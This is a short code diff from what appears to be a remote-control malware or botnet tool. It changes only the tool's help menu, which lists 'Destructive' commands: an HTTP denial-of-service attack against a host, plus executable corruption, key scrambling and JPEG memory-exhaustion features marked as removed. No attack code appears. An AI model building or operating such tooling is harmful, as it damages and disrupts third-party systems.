@@ -864,7 +864,7 @@ cmdList = """
 [Destructive]:
 	stress [host] - HTTP Denial of Service
 	scramblekeys - Scramble Key Output (Feature Removed)
-	WAEV - Executable Corruption Virus (Feature Removed)
+	exev - Executable Corruption (Feature Removed)
 	morphine - JPEG Injection Memory Exhaustion (Feature Removed)
 	
 [Controller]:
